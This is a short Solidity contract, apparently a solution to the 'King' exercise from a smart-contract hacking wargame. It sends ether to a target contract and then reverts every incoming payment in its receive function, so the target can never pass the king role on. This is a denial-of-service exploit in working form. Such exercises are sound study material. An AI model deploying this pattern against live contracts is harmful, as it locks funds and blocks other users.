// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// Uncomment this line to use console.log
import "hardhat/console.sol";

contract KingV1 {
    address payable public owner;
    address payable targetContractI;

    constructor(address targetContract) payable {
        owner = payable(msg.sender);
        targetContractI = payable(targetContract);
    }

    function crack() public payable {
        require(msg.sender == owner, "You aren't the owner");
        console.log("Aca");
        (bool success, ) = targetContractI.call{value: msg.value}(""); // Doesnt work with transfer, migth be the gas restrictiong
        require(success, "Transfer failed");
    }

    receive() external payable {
        revert();
    }
}
